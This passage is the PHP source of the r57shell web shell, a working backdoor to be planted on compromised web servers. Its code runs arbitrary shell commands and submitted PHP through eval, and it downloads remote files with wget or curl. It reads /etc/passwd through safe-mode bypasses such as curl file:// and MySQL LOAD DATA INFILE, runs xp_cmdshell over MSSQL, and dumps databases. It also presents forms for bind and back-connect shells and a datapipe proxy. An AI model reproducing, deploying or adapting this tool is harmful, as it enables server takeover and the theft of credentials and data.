 $_POST['cmd'] = which('fetch')." -p ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 case lynx:
 $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case links:
 $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case GET:
 $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case curl:
 $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
echo $table_up3;
if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>";
if($safe_mode)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if($windows){
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d->close();
   }
  else echo $lang[$language._text29];
 break;
 case 'safe_file':
  if(@is_file($_POST['file']))
   {
   $file = @file($_POST['file']);
   if($file)
    {
    $c = @sizeof($file);
    for($i=0;$i<$c;$i++) { echo htmlspecialchars($file[$i]); }
    }
   else echo $lang[$language._text29];
   }
  else echo $lang[$language._text31];
  break;
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']."");
  $cf = @curl_exec($ci);
  echo $cf;
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'test3':
  if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = "3306"; }
  $db = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);
  if($db)
   {
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
     $sql = "CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );";
     @mysql_query($sql);
     $sql = "LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table;";
     @mysql_query($sql);
     $sql = "SELECT * FROM temp_r57_table;";
     $r = @mysql_query($sql);
     while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0]); }
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to mysql server";
  break;
  case 'test4':
  if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table r57_temp_table",$db);
     @mssql_query("create table r57_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into r57_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from r57_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo $row[0]."\r\n";
      }
    @mssql_query("drop table r57_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
 }
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_show")&&($_POST['cmd']!="db_query")){
 $cmd_rep = ex($_POST['cmd']);
 if($windows) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }}
if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);}
if ($_POST['cmd']=="db_show")
 {
 switch($_POST['db'])
 {
 case 'MySQL':
 if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }
 $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
 if($db)
   {
   $res=@mysql_query("SHOW DATABASES", $db);
   while(($row=@mysql_fetch_row($res)))
    {
     echo "[+] ".$row[0]."\r\n";
     if(isset($_POST['st'])){
     $res2 = @mysql_query("SHOW TABLES FROM ".$row[0],$db);
     while(($row2=@mysql_fetch_row($res2)))
      {
      echo " | - ".$row2[0]."\r\n";
      if(isset($_POST['sc']))
       {
       $res3 = @mysql_query("SHOW COLUMNS FROM ".$row[0].".".$row2[0],$db);
       while(($row3=@mysql_fetch_row($res3))) { echo "   | - ".$row3[0]."\r\n"; }
       }
      }
     }
    }
   @mysql_close($db);
   }
 else echo "[-] ERROR! Can't connect to MySQL server";
 break;
 case 'MSSQL':
 if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }
 $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
 if($db)
   {
   $res=@mssql_query("sp_databases", $db);
   while(($row=@mssql_fetch_row($res)))
    {
     echo "[+] ".$row[0]."\r\n";
     if(isset($_POST['st'])){
     @mssql_select_db($row[0]);
     $res2 = @mssql_query("sp_tables",$db);
     while(($row2=@mssql_fetch_array($res2)))
      {
      if($row2['TABLE_TYPE'] == 'TABLE' && $row2['TABLE_NAME'] != 'dtproperties')
      {
      echo " | - ".$row2['TABLE_NAME']."\r\n";
      if(isset($_POST['sc']))
       {
       $res3 = @mssql_query("sp_columns ".$row2[2],$db);
       while(($row3=@mssql_fetch_array($res3))) { echo "   | - ".$row3['COLUMN_NAME']."\r\n"; }
       }
      }
      }
     }
    }
   @mssql_close($db);
   }
 else echo "[-] ERROR! Can't connect to MSSQL server";
 break;
 case 'PostgreSQL':
 if(empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; }
  $str = "host='localhost' port='".$_POST['db_port']."' user='".$_POST['mysql_l']."' password='".$_POST['mysql_p']."' dbname='".$_POST['mysql_db']."'";
  $db = @pg_connect($str);
  if($db)
  {
  $res=@pg_query($db,"SELECT datname FROM pg_database WHERE datistemplate='f'");
   while(($row=@pg_fetch_row($res)))
    {
     echo "[+] ".$row[0]."\r\n";
    }
  @pg_close($db);
  }
 else echo "[-] ERROR! Can't connect to PostgreSQL server";
 break;
 }
 }
if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  if((!empty($_POST['dif'])&&$fp)||(empty($_POST['dif']))){
  $sqh  = "# homepage: http://rst.void.ru\r\n";
  $sqh .= "# ---------------------------------\r\n";
  $sqh .= "#     date : ".date ("j F Y g:i")."\r\n";
  $sqh .= "# database : ".$_POST['mysql_db']."\r\n";
  $sqh .= "#    table : ".$_POST['mysql_tbl']."\r\n";
  $sqh .= "# ---------------------------------\r\n\r\n";
  switch($_POST['db']){
  case 'MySQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }
  $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {
   if(@mysql_select_db($_POST['mysql_db'],$db))
    {
     $sql1  = "# MySQL dump created by r57shell\r\n";
     $sql1 .= $sqh;
     $res   = @mysql_query("SHOW CREATE TABLE `".$_POST['mysql_tbl']."`", $db);
     $row   = @mysql_fetch_row($res);
     $sql1 .= $row[1]."\r\n\r\n";
     $sql1 .= "# ---------------------------------\r\n\r\n";
     $sql2 = '';
     $res = @mysql_query("SELECT * FROM `".$_POST['mysql_tbl']."`", $db);
     if (@mysql_num_rows($res) > 0) {
     while (($row = @mysql_fetch_assoc($res))) {
     $keys = @implode("`, `", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO `".$_POST['mysql_tbl']."` (`".$keys."`) VALUES ('".htmlspecialchars($values)."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
    if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
    else { echo $sql1.$sql2; }
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MySQL server";
  break;
  case 'MSSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }
  $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
  {
   if(@mssql_select_db($_POST['mysql_db'],$db))
    {
     $sql1  = "# MSSQL dump created by r57shell\r\n";
     $sql1 .= $sqh;
     $sql2 = '';
     $res = @mssql_query("SELECT * FROM ".$_POST['mysql_tbl']."", $db);
     if (@mssql_num_rows($res) > 0) {
     while (($row = @mssql_fetch_assoc($res))) {
     $keys = @implode(", ", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO ".$_POST['mysql_tbl']." (".$keys.") VALUES ('".htmlspecialchars($values)."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
     if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
     else { echo $sql1.$sql2; }
    }
   else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
  }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'PostgreSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; }
  $str = "host='localhost' port='".$_POST['db_port']."' user='".$_POST['mysql_l']."' password='".$_POST['mysql_p']."' dbname='".$_POST['mysql_db']."'";
  $db = @pg_connect($str);
  if($db)
  {
     $sql1  = "# PostgreSQL dump created by r57shell\r\n";
     $sql1 .= $sqh;
     $sql2 = '';
     $res = @pg_query($db,"SELECT * FROM ".$_POST['mysql_tbl']."");
     if (@pg_num_rows($res) > 0) {
     while (($row = @pg_fetch_assoc($res))) {
     $keys = @implode(", ", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO ".$_POST['mysql_tbl']." (".$keys.") VALUES ('".htmlspecialchars($values)."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
     if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
     else { echo $sql1.$sql2; }
   @pg_close($db);
  }
  else echo "[-] ERROR! Can't connect to PostgreSQL server";
  break;
  }
 }
 else if(!empty($_POST['dif'])&&!$fp) { echo "[-] ERROR! Can't write in dump file"; }
 }
echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
echo "<table width=100% cellpadding=0 cellspacing=0>";
if(!$safe_mode){
echo $fs.$table_up1.$lang[$language.'_text2'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','cmd',85,''));
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.$table_end1.$fe;
}
else{
echo $fs.$table_up1.$lang[$language.'_text28'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
echo $te.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text42'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.$table_end1.$fe;
if($safe_mode){
echo $fs.$table_up1.$lang[$language.'_text57'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text58'].$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>".$lang[$language.'_text65']."</option><option value=delete>".$lang[$language.'_text66']."</option></select>".ws(3)."<select name=what><option value=file>".$lang[$language.'_text59']."</option><option value=dir>".$lang[$language.'_text60']."</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
echo $te.$table_end1.$fe;
}
if($safe_mode && $unix){
echo $fs.$table_up1.$lang[$language.'_text67'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text68'].$arrow."</b>","<select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>".ws(2)."<b>".$lang[$language.'_text69'].$arrow."</b>".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."<b>".$lang[$language.'_text70'].$arrow."</b>".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.$table_end1.$fe;
}
if(!$safe_mode){
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 $aliases2 .= "<option>$alias_name</option>";
 }
echo $fs.$table_up1.$lang[$language.'_text7'].$table_up2.$ts;
echo sr(15,"<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text54'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text52'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text53'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text55'].$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.$table_end1.$fe;
echo $fs.$table_up1.$lang[$language.'_text76'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text72'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text73'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text74'].$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.$table_end1.$fe;
echo $fs.$table_up1.$lang[$language.'_text32'].$table_up2.$font;
echo "<div align=center><textarea name=php_eval cols=100 rows=3>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");"));
echo "</textarea>";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "</font>";
echo $table_end1.$fe;
if($safe_mode&&$curl_on)
{
echo $fs.$table_up1.$lang[$language.'_text33'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1.$lang[$language.'_text34'].$table_up2.$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.$table_end1.$fe;
}
if($safe_mode&&$mysql_on)
{
echo $fs.$table_up1.$lang[$language.'_text35'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test3_port',15,(!empty($_POST['test3_port'])?($_POST['test3_port']):("3306"))));
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.$table_end1.$fe;
}
if($safe_mode&&$mssql_on)
{
echo $fs.$table_up1.$lang[$language.'_text85'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.$table_end1.$fe;
}
if(@ini_get('file_uploads')){
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1.$lang[$language.'_text5'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile',85,''));
echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.$table_end1.$fe;
}
if(!$safe_mode&&!$windows){
echo $fs.$table_up1.$lang[$language.'_text15'].$table_up2.$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','rem_file',78,'http://'));
echo sr(15,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.$table_end1.$fe;
}
if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
echo $table_up1.$lang[$language.'_text82'].$table_up2.$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center>".$lang[$language.'_text77']."</div></b></font>";
echo sr(45,"<b>".$lang[$language.'_text80'].$arrow."</b>","<select name=db><option>MySQL</option><option>MSSQL</option><option>PostgreSQL</option></select>");
echo sr(45,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(45,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))));
echo sr(45,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(45,"<b>".$lang[$language.'_text78'].$arrow."</b>",in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_show').in('checkbox','st id=st',0,'1'));
echo sr(45,"<b>".$lang[$language.'_text79'].$arrow."</b>",in('checkbox','sc id=sc',0,'1'));
echo sr(45,"",in('submit','submit',0,$lang[$language.'_butt7']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center>".$lang[$language.'_text40']."</div></b></font>";
echo sr(45,"<b>".$lang[$language.'_text80'].$arrow."</b>","<select name=db><option>MySQL</option><option>MSSQL</option><option>PostgreSQL</option></select>");
echo sr(45,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(45,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))));
echo sr(45,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(45,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(45,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(45,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$lang[$language.'_text41'].$arrow."</b>",in('checkbox','dif id=dif',0,'1'));
echo sr(45,"<b>".$lang[$language.'_text59'].$arrow."</b>",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(45,"",in('submit','submit',0,$lang[$language.'_butt9']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center>".$lang[$language.'_text83']."</div></b></font>";
echo sr(45,"<b>".$lang[$language.'_text80'].$arrow."</b>","<select name=db><option>MySQL</option><option>MSSQL</option><option>PostgreSQL</option><option>Oracle</option></select>");
echo sr(45,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(45,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))));
echo sr(45,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(45,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(45,"<b>".$lang[$language.'_text84'].$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."<div align=center><textarea cols=35 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div></td>".$fe."</tr></table>";
}
if(!$safe_mode&&!$windows){
echo $table_up1.$lang[$language.'_text81'].$table_up2.$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center>".$lang[$language.'_text9']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port',15,'11457'));
echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',15,'r57'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'11457'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center>".$lang[$language.'_text22']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',15,'11457'));
echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',15,'irc.dalnet.ru'));
echo sr(40,"<b>".$lang[$language.'_text25'].$arrow."</b>",in('text','remote_port',15,'6667'));
echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."</td>".$fe."</tr></table>";
}
echo $table_up3."<div align=center><font face=Verdana size=-2><b>o---[ r57shell - http-shell by Andika - Modification By Andika | <a href=http://www.betalmostdone.tk>http://www.betalmostdone.tk</a> | version ".$version." ]---o</b></font></div></td></tr></table>".$f;
?>

